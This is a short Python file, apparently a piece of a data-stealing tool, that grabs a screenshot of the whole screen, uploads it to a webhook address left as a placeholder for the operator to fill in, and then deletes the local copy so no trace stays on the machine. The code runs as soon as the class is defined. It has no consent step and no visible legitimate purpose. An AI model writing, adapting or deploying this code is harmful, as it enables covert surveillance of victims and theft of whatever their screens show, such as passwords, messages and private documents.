import time
import os
import requests
from PIL import ImageGrab

class Screenshot():
        webhook = 'WEBHOOKHERE' # place webhook here

        screenshot = ImageGrab.grab()
        screenshot_filename = "screenshot.png"
        screenshot.save(screenshot_filename)
        with open(screenshot_filename, "rb") as f:
            file = {"file": f}
            payload = {"content": ""}
            r = requests.post(webhook, data=payload, files=file)
        os.remove(screenshot_filename)
